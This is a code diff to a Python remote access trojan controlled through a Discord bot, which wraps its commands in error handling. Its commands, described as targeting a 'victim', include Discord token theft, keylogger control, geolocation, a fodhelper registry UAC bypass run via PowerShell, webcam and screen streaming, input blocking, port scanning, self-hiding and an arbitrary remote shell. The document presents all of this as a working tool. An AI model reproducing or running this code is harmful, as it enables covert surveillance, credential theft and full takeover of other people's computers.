@@ -287,19 +287,22 @@ if anti_debug_switch == True:
 else:
     pass
 
-
-if vtdetect_switch == True:
-    vtdetect()
-else:
-    pass
-if vmcheck_switch == True:
-    vmcheck()
-else:
-    pass
-if listcheck_switch == True:
-    listcheck()
-else:
-    pass
+try:
+    if vtdetect_switch == True:
+        vtdetect()
+    else:
+        pass
+    if vmcheck_switch == True:
+        vmcheck()
+    else:
+        pass
+    if listcheck_switch == True:
+        listcheck()
+    else:
+        pass
+except Exception as e:
+    requests.post(f'{api}',json={'content': f"**Error:** `{e}`"})
+    os._exit(1)
 
 
 # Bot command prefix
@@ -312,7 +315,7 @@ async def on_slash_command_error(ctx, error):
     if isinstance(error, discord.ext.commands.errors.MissingPermissions):
         await ctx.send('Discord BOT missing correct permissions, please make sure to give the BOT admin perms')
     else:
-        print(error)
+        requests.post(f'{api}',json={'content': f"**Error:** `{e}`"})
 
 @client.event
 async def on_command_error(cmd, error):
@@ -402,14 +405,18 @@ def uncritproc():
 async def kill_command(ctx: SlashContext):
     my_embed = discord.Embed(title=f"Killing all inactive sessions, please wait", color=0x3A3636)
     await ctx.send(embed=my_embed)
-    for y in range(len(on_ready.total)): 
-        if "session" in on_ready.total[y]:
-            channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
-            await channel_to_delete.delete()
-        else:
-            pass
-    my_embed = discord.Embed(title=f"Killed all the inactive sessions", color=0x00FF00)
-    await ctx.send(embed=my_embed)
+    try: 
+        for y in range(len(on_ready.total)): 
+            if "session" in on_ready.total[y]:
+                channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
+                await channel_to_delete.delete()
+            else:
+                pass
+        my_embed = discord.Embed(title=f"Killed all the inactive sessions", color=0x00FF00)
+        await ctx.send(embed=my_embed)
+    except Exception as e:
+        my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+        await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="exit", description="stop the program on victims pc", guild_ids=g)
@@ -439,46 +446,58 @@ async def exit_command(ctx: SlashContext):
 @slash.slash(name="info", description="gather info about the user (ip)", guild_ids=g)
 async def info_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import platform
-        jak = str(platform.uname())
-        intro = jak[12:]
-        from requests import get
-        ip = get('https://api.ipify.org').text
-        pp = "IP Address = " + ip
-        my_embed = discord.Embed(title=f"Command executed : {intro} {pp}", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+        try:
+            import platform
+            jak = str(platform.uname())
+            intro = jak[12:]
+            from requests import get
+            ip = get('https://api.ipify.org').text
+            pp = "IP Address = " + ip
+            my_embed = discord.Embed(title=f"Command executed : {intro} {pp}", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="geolocate", description="geo locate the victim (not very accurate)", guild_ids=g)
 async def info_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import urllib.request
-        import json
-        with urllib.request.urlopen("https://geolocation-db.com/json") as url:
-            data = json.loads(url.read().decode())
-            link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
-            my_embed = discord.Embed(title=f"Command executed : {link}", color=0x00FF00)
-            await ctx.send(embed=my_embed)    
+        try:
+            import urllib.request
+            import json
+            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
+                data = json.loads(url.read().decode())
+                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
+                my_embed = discord.Embed(title=f"Command executed : {link}", color=0x00FF00)
+                await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="keyloggerstop", description="stop keylogger", guild_ids=g)
 async def keyloggerstop_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import psutil
-        temp = (os.getenv("temp"))
-        if os.path.exists(f'{temp}\\$~cache\\sd.exe'):
-            try:
-                for proc in psutil.process_iter():
-                    if proc.name() == "sd.exe":
-                        proc.kill()
-                os.remove(f'{temp}\$~cache\sd.exe')
-            except Exception as e:
-                my_embed = discord.Embed(title=f"Error occured while stopping keylogger\n\n{e}", color=0xFF0000)
+        try:
+            import psutil
+            temp = (os.getenv("temp"))
+            if os.path.exists(f'{temp}\\$~cache\\sd.exe'):
+                try:
+                    for proc in psutil.process_iter():
+                        if proc.name() == "sd.exe":
+                            proc.kill()
+                    os.remove(f'{temp}\$~cache\sd.exe')
+                except Exception as e:
+                    my_embed = discord.Embed(title=f"Error occured while stopping keylogger\n\n{e}", color=0xFF0000)
+                    await ctx.send(embed=my_embed)
+                my_embed = discord.Embed(title=f"Keylogger stopped and uninstalled successfully", color=0x00FF00)
                 await ctx.send(embed=my_embed)
-            my_embed = discord.Embed(title=f"Keylogger stopped and uninstalled successfully", color=0x00FF00)
-            await ctx.send(embed=my_embed)
-        else:
-            my_embed = discord.Embed(title=f"Error no running keylogger found", color=0xFF0000)
+            else:
+                my_embed = discord.Embed(title=f"Error no running keylogger found", color=0xFF0000)
+                await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
             await ctx.send(embed=my_embed)
 
 
@@ -515,61 +534,65 @@ async def KeyLogger_command(ctx: SlashContext, keylogger_downlod_link: str):
 @slash.slash(name="forceAdmin", description="attempt to force admin, Works but very buggy", guild_ids=g)
 async def forceAdmin_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import winreg
-        import ctypes
-        import sys
-        import os
-        import time
-        import inspect
-        def isAdmin():
-            try:
-                is_admin = (os.getuid() == 0)
-            except AttributeError:
-                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            return is_admin
-        if isAdmin():
-            my_embed = discord.Embed(title=f"You are already admin", color=0xFF0000)
-            await ctx.send(embed=my_embed)
-        else:
-            class disable_fsr():
-                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
-                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
-                def __enter__(self):
-                    self.old_value = ctypes.c_long()
-                    self.success = self.disable(ctypes.byref(self.old_value))
-                def __exit__(self, type, value, traceback):
-                    if self.success:
-                        self.revert(self.old_value)
-            my_embed = discord.Embed(title=f"Attempting to get admin, please wait", color=0x3A3636)
-            await ctx.send(embed=my_embed)
-            isexe=False
-            if (sys.argv[0].endswith("exe")):
-                isexe=True
-            if not isexe:
-                test_str = sys.argv[0]
-                current_dir = inspect.getframeinfo(inspect.currentframe()).filename
-                cmd2 = current_dir
-                create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
-                os.system(create_reg_path)
-                create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
-                os.system(create_trigger_reg_key) 
-                create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
-                os.system(create_payload_reg_key)
+        try:
+            import winreg
+            import ctypes
+            import sys
+            import os
+            import time
+            import inspect
+            def isAdmin():
+                try:
+                    is_admin = (os.getuid() == 0)
+                except AttributeError:
+                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+                return is_admin
+            if isAdmin():
+                my_embed = discord.Embed(title=f"You are already admin", color=0xFF0000)
+                await ctx.send(embed=my_embed)
             else:
-                test_str = sys.argv[0]
-                current_dir = test_str
-                cmd2 = current_dir
-                create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
-                os.system(create_reg_path)
-                create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
-                os.system(create_trigger_reg_key) 
-                create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
-                os.system(create_payload_reg_key)
-            with disable_fsr():
-                os.system("fodhelper.exe")  
-            time.sleep(2)
-            remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
-            os.system(remove_reg)
+                class disable_fsr():
+                    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
+                    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
+                    def __enter__(self):
+                        self.old_value = ctypes.c_long()
+                        self.success = self.disable(ctypes.byref(self.old_value))
+                    def __exit__(self, type, value, traceback):
+                        if self.success:
+                            self.revert(self.old_value)
+                my_embed = discord.Embed(title=f"Attempting to get admin, please wait", color=0x3A3636)
+                await ctx.send(embed=my_embed)
+                isexe=False
+                if (sys.argv[0].endswith("exe")):
+                    isexe=True
+                if not isexe:
+                    test_str = sys.argv[0]
+                    current_dir = inspect.getframeinfo(inspect.currentframe()).filename
+                    cmd2 = current_dir
+                    create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
+                    os.system(create_reg_path)
+                    create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
+                    os.system(create_trigger_reg_key) 
+                    create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
+                    os.system(create_payload_reg_key)
+                else:
+                    test_str = sys.argv[0]
+                    current_dir = test_str
+                    cmd2 = current_dir
+                    create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
+                    os.system(create_reg_path)
+                    create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
+                    os.system(create_trigger_reg_key) 
+                    create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
+                    os.system(create_payload_reg_key)
+                with disable_fsr():
+                    os.system("fodhelper.exe")  
+                time.sleep(2)
+                remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
+                os.system(remove_reg)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="tokens", description="get all their discord tokens", guild_ids=g)
@@ -577,8 +600,7 @@ async def tokens_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
         my_embed = discord.Embed(title=f"Extracting tokens, please wait", color=0x3A3636)
         await ctx.send(embed=my_embed)
-        import os, re, json
-        from urllib.request import Request, urlopen
+        import os, re
 
         async def find_tokens(path):
             path += '\\Local Storage\\leveldb'
@@ -638,24 +660,32 @@ async def tokens_command(ctx: SlashContext):
 @slash.slash(name="windowstart", description="start the window logger", guild_ids=g)
 async def windowstart_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        global stop_threads
-        stop_threads = False
+        try:
+            global stop_threads
+            stop_threads = False
 
-        threading.Thread(target=between_callback, args=(client,)).start()
-        my_embed = discord.Embed(title=f"Window logging for this session started", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+            threading.Thread(target=between_callback, args=(client,)).start()
+            my_embed = discord.Embed(title=f"Window logging for this session started", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="windowstop", description="stop window logger", guild_ids=g)
 async def windowstop_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        global stop_threads
-        stop_threads = True
+        try:
+            global stop_threads
+            stop_threads = True
 
-        my_embed = discord.Embed(title=f"Window logging for this session stopped", color=0x00FF00)
-        await ctx.send(embed=my_embed)
-        game = discord.Game(f"RAT | cookiesservices.xyz")
-        await client.change_presence(status=discord.Status.online, activity=game)
+            my_embed = discord.Embed(title=f"Window logging for this session stopped", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+            game = discord.Game(f"RAT | cookiesservices.xyz")
+            await client.change_presence(status=discord.Status.online, activity=game)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 def change_res(cap, width, height):
@@ -715,27 +745,39 @@ async def screenshot_command(ctx: SlashContext):
 @slash.slash(name="MaxVolume", description="set their sound to max", guild_ids=g)
 async def MaxVolume_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        MaxVolume()
-        my_embed = discord.Embed(title=f"Volume set to 100%", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+        try:
+            MaxVolume()
+            my_embed = discord.Embed(title=f"Volume set to 100%", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="MuteVolume", description="set their sound to 0", guild_ids=g)
 async def MuteVolume_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        MuteVolume()
-        my_embed = discord.Embed(title=f"Volume set to 0%", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+        try:
+            MuteVolume()
+            my_embed = discord.Embed(title=f"Volume set to 0%", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="Voice", description="voice message of your choice", guild_ids=g)
 async def Voice_command(ctx: SlashContext, voicespeak: str):
     if ctx.channel.name == channel_name:
-        my_embed = discord.Embed(title=f"Voice message sent!\n{voicespeak}", color=0x00FF00)
-        await ctx.send(embed=my_embed)
-        speak = wincl.Dispatch("SAPI.SpVoice")
-        speak.Speak(voicespeak)
-        comtypes.CoUninitialize()
+        try:
+            my_embed = discord.Embed(title=f"Voice message sent!\n{voicespeak}", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+            speak = wincl.Dispatch("SAPI.SpVoice")
+            speak.Speak(voicespeak)
+            comtypes.CoUninitialize()
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 @slash.slash(name="Download", description="download file from victim", guild_ids=g)
 async def Download_command(ctx: SlashContext, downloadfile: str):
@@ -762,331 +804,387 @@ async def Download_command(ctx: SlashContext, downloadfile: str):
 @slash.slash(name="StreamWebCam", description="Stream webcam, time format (hh:mm:ss)", guild_ids=g)
 async def StreamWebCam_command(ctx: SlashContext, stream_time: str):
     if ctx.channel.name == channel_name:
-        import time, os, cv2
+        try:
+            import time, os, cv2
 
-        def convert_seconds(time_str):
-            hh, mm, ss = time_str.split(':')
-            return int(hh) * 3600 + int(mm) * 60 + int(ss)
+            def convert_seconds(time_str):
+                hh, mm, ss = time_str.split(':')
+                return int(hh) * 3600 + int(mm) * 60 + int(ss)
 
-        time_length = stream_time 
-        seconds_length = convert_seconds(time_length) 
-        global end
-        end = time.time() + seconds_length
+            time_length = stream_time 
+            seconds_length = convert_seconds(time_length) 
+            global end
+            end = time.time() + seconds_length
 
-        async def StreamWebcam(end):
-            temp = (os.getenv('TEMP'))
-            hellos = temp + r"\\hobos\\hellos.txt"        
-            if os.path.isfile(hellos):
-                os.system(r"del %temp%\\hobos\\hellos.txt /f")
-                os.system(r"RMDIR %temp%\\hobos /s /q")     
-            else:
-                pass
-            while time.time() < end:
-                temp = os.path.join(os.getenv('TEMP') + "\\webcam.jpg")
-                camera = cv2.VideoCapture(0)
-                return_value,image = camera.read()
-                cv2.imwrite(temp,image)
-                camera.release()
-                file = discord.File(temp, filename="webcam.jpg")
-                await ctx.send(file=file)
-                hellos = temp + r"\\hobos\\hellos.txt"
+            async def StreamWebcam(end):
+                temp = (os.getenv('TEMP'))
+                hellos = temp + r"\\hobos\\hellos.txt"        
                 if os.path.isfile(hellos):
-                    break
+                    os.system(r"del %temp%\\hobos\\hellos.txt /f")
+                    os.system(r"RMDIR %temp%\\hobos /s /q")     
                 else:
-                    continue
+                    pass
+                while time.time() < end:
+                    temp = os.path.join(os.getenv('TEMP') + "\\webcam.jpg")
+                    camera = cv2.VideoCapture(0)
+                    return_value,image = camera.read()
+                    cv2.imwrite(temp,image)
+                    camera.release()
+                    file = discord.File(temp, filename="webcam.jpg")
+                    await ctx.send(file=file)
+                    hellos = temp + r"\\hobos\\hellos.txt"
+                    if os.path.isfile(hellos):
+                        break
+                    else:
+                        continue
 
-            if time.time() > end:
-                my_embed = discord.Embed(title=f"Finshed streaming webcam", color=0x00FF00)
-                await ctx.send(embed=my_embed)
-        
-        my_embed = discord.Embed(title=f"Streaming webcam for {seconds_length} Seconds", color=0x00FF00)
-        await ctx.send(embed=my_embed)
-        await StreamWebcam(end)  
+                if time.time() > end:
+                    my_embed = discord.Embed(title=f"Finshed streaming webcam", color=0x00FF00)
+                    await ctx.send(embed=my_embed)
+            
+            my_embed = discord.Embed(title=f"Streaming webcam for {seconds_length} Seconds", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+            await StreamWebcam(end) 
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed) 
             
 
 @slash.slash(name="DisplayOFF", description="Turns users Display OFF, Admin rights needed", guild_ids=g)
 async def DisplayOFF_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import ctypes
-        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        if is_admin == True:
+        try:
             import ctypes
-            WM_SYSCOMMAND = 274
-            HWND_BROADCAST = 65535
-            SC_MONITORPOWER = 61808
-            ctypes.windll.user32.BlockInput(True)
-            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
-            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
-            await ctx.send(embed=my_embed)
-        else:
-            my_embed = discord.Embed(title=f"Admin rights are required", color=0xFF0000)
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if is_admin == True:
+                import ctypes
+                WM_SYSCOMMAND = 274
+                HWND_BROADCAST = 65535
+                SC_MONITORPOWER = 61808
+                ctypes.windll.user32.BlockInput(True)
+                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
+                my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
+                await ctx.send(embed=my_embed)
+            else:
+                my_embed = discord.Embed(title=f"Admin rights are required", color=0xFF0000)
+                await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
             await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="DisplayON", description="Turns users Display ON, Admin rights needed", guild_ids=g)
 async def DisplayON_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import ctypes
-        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        if is_admin == True:
-            from pynput.keyboard import Key, Controller
-            keyboard = Controller()
-            keyboard.press(Key.esc)
-            keyboard.release(Key.esc)
-            keyboard.press(Key.esc)
-            keyboard.release(Key.esc)
-            ctypes.windll.user32.BlockInput(False)
-            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
-            await ctx.send(embed=my_embed)
-        else:
-            my_embed = discord.Embed(title=f"Admin rights are required", color=0xFF0000)
+        try:
+            import ctypes
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if is_admin == True:
+                from pynput.keyboard import Key, Controller
+                keyboard = Controller()
+                keyboard.press(Key.esc)
+                keyboard.release(Key.esc)
+                keyboard.press(Key.esc)
+                keyboard.release(Key.esc)
+                ctypes.windll.user32.BlockInput(False)
+                my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
+                await ctx.send(embed=my_embed)
+            else:
+                my_embed = discord.Embed(title=f"Admin rights are required", color=0xFF0000)
+                await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
             await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="TaskKill", description="kill any of their task, add the .exe etc to the end", guild_ids=g)
 async def TaskKill_command(ctx: SlashContext, tasktokill: str):
     if ctx.channel.name == channel_name:
-        os.system(f"taskkill /F /IM {tasktokill}")
-        my_embed = discord.Embed(title=f"{tasktokill} killed succesfully", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+        try:
+            os.system(f"taskkill /F /IM {tasktokill}")
+            my_embed = discord.Embed(title=f"{tasktokill} killed succesfully", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="OpenPortScan", description="scan victims local/public IP address for open ports", guild_ids=g)
 async def OpenPortScan_command(ctx: SlashContext, ip: str, starting_port: int, ending_port: int, thread_amount: int):
     if ctx.channel.name == channel_name:
-        from queue import Queue
-        import socket
-        import threading
+        try:
+            from queue import Queue
+            import socket
+            import threading
 
-        target = ip
-        queue = Queue()
-        open_ports = []
+            target = ip
+            queue = Queue()
+            open_ports = []
 
-        def portscan(port):
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.connect((target, port))
-                return True
-            except:
-                return False
+            def portscan(port):
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.connect((target, port))
+                    return True
+                except:
+                    return False
 
-        def get_ports(starting_port, ending_port):
-            for port in range(starting_port, ending_port):
-                queue.put(port)
-            
+            def get_ports(starting_port, ending_port):
+                for port in range(starting_port, ending_port):
+                    queue.put(port)
+                
 
-        def worker():
-            while not queue.empty():
-                port = queue.get()
-                if portscan(port):
-                    open_ports.append(port)
+            def worker():
+                while not queue.empty():
+                    port = queue.get()
+                    if portscan(port):
+                        open_ports.append(port)
 
-        async def run_scanner(thread_amount, starting_port, ending_port):
+            async def run_scanner(thread_amount, starting_port, ending_port):
 
-            get_ports(starting_port, ending_port)
+                get_ports(starting_port, ending_port)
 
-            thread_list = []
+                thread_list = []
 
-            for t in range(thread_amount):
-                thread = threading.Thread(target=worker)
-                thread_list.append(thread)
+                for t in range(thread_amount):
+                    thread = threading.Thread(target=worker)
+                    thread_list.append(thread)
 
-            for thread in thread_list:
-                thread.start()
+                for thread in thread_list:
+                    thread.start()
 
-            for thread in thread_list:
-                thread.join()
+                for thread in thread_list:
+                    thread.join()
 
-            my_embed = discord.Embed(title=f"Open ports are: {open_ports}", color=0x00FF00)
+                my_embed = discord.Embed(title=f"Open ports are: {open_ports}", color=0x00FF00)
+                await ctx.send(embed=my_embed)
+
+            my_embed = discord.Embed(title=f"Scanning ports, please wait", color=0x3A3636)
             await ctx.send(embed=my_embed)
-
-        my_embed = discord.Embed(title=f"Scanning ports, please wait", color=0x3A3636)
-        await ctx.send(embed=my_embed)
-        await run_scanner(thread_amount, starting_port, ending_port)
+            await run_scanner(thread_amount, starting_port, ending_port)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="StreamScreen", description="Stream screen, time format (hh:mm:ss)", guild_ids=g)
 async def StreamScreen_command(ctx: SlashContext, stream_time: str):
     if ctx.channel.name == channel_name:
-        import time, os, pyautogui
-        from PIL import ImageGrab
-        from functools import partial
+        try:
+            import time, os, pyautogui
+            from PIL import ImageGrab
+            from functools import partial
 
-        def convert_seconds(time_str):
-            # split in hh, mm, ss
-            hh, mm, ss = time_str.split(':')
-            return int(hh) * 3600 + int(mm) * 60 + int(ss)
+            def convert_seconds(time_str):
+                # split in hh, mm, ss
+                hh, mm, ss = time_str.split(':')
+                return int(hh) * 3600 + int(mm) * 60 + int(ss)
 
-        time_length = stream_time 
-        seconds_length = convert_seconds(time_length) 
-        global end
-        end = time.time() + seconds_length
+            time_length = stream_time 
+            seconds_length = convert_seconds(time_length) 
+            global end
+            end = time.time() + seconds_length
 
-        async def StreamScreen(end):
-            temp = (os.getenv('TEMP'))
-            hellos = temp + r"\\hobos\\hellos.txt"        
-            if os.path.isfile(hellos):
-                os.system(r"del %temp%\\hobos\\hellos.txt /f")
-                os.system(r"RMDIR %temp%\\hobos /s /q")     
-            else:
-                pass
-            while time.time() < end:
-                ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
-                screen = pyautogui.screenshot()
-                screen.save(temp + r"\\monitor.png")
-                path = temp + r"\\monitor.png"
-                file = discord.File((path), filename="monitor.png")
-                await ctx.send(file=file)
-                hellos = temp + r"\\hobos\\hellos.txt"
+            async def StreamScreen(end):
+                temp = (os.getenv('TEMP'))
+                hellos = temp + r"\\hobos\\hellos.txt"        
                 if os.path.isfile(hellos):
-                    break
+                    os.system(r"del %temp%\\hobos\\hellos.txt /f")
+                    os.system(r"RMDIR %temp%\\hobos /s /q")     
                 else:
-                    continue
+                    pass
+                while time.time() < end:
+                    ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
+                    screen = pyautogui.screenshot()
+                    screen.save(temp + r"\\monitor.png")
+                    path = temp + r"\\monitor.png"
+                    file = discord.File((path), filename="monitor.png")
+                    await ctx.send(file=file)
+                    hellos = temp + r"\\hobos\\hellos.txt"
+                    if os.path.isfile(hellos):
+                        break
+                    else:
+                        continue
 
-            if time.time() > end:
-                my_embed = discord.Embed(title=f"Finshed streaming screen", color=0x00FF00)
-                await ctx.send(embed=my_embed)
-        
-        my_embed = discord.Embed(title=f"Streaming screen for {seconds_length} Seconds", color=0x00FF00)
-        await ctx.send(embed=my_embed)
-        await StreamScreen(end)
+                if time.time() > end:
+                    my_embed = discord.Embed(title=f"Finshed streaming screen", color=0x00FF00)
+                    await ctx.send(embed=my_embed)
+            
+            my_embed = discord.Embed(title=f"Streaming screen for {seconds_length} Seconds", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+            await StreamScreen(end)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="HideRAT", description="Hides the file by changing the attribute to hidden", guild_ids=g)
 async def HideRAT_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import os
-        import inspect
-        cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
-        os.system("""attrib +h "{}" """.format(cmd237))
-        my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+        try:
+            import os
+            import inspect
+            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
+            os.system("""attrib +h "{}" """.format(cmd237))
+            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="UnHideRAT", description="UnHides the file by removing the hidden attribute", guild_ids=g)
 async def UnHideRAT_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import os
-        import inspect
-        cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
-        os.system("""attrib -h "{}" """.format(cmd237))
-        my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
-        await ctx.send(embed=my_embed)
+        try:
+            import os
+            import inspect
+            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
+            os.system("""attrib -h "{}" """.format(cmd237))
+            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
+            await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="Shell", description="run shell commands", guild_ids=g)
 async def Shell_command(ctx: SlashContext, command: str):
     if ctx.channel.name == channel_name:
-        global status
-        status = None
-        import subprocess
-        import os
-        instruction = command
-        def shell(command):
-            output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        try:
             global status
-            status = "ok"
-            return output.stdout.decode('CP437').strip()
-        out = shell(instruction)
-        print(out)
-        print(status)
-        if status:
-            numb = len(out)
-            if numb < 1:
+            status = None
+            import subprocess
+            import os
+            instruction = command
+            def shell(command):
+                output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                global status
+                status = "ok"
+                return output.stdout.decode('CP437').strip()
+            out = shell(instruction)
+            print(out)
+            print(status)
+            if status:
+                numb = len(out)
+                if numb < 1:
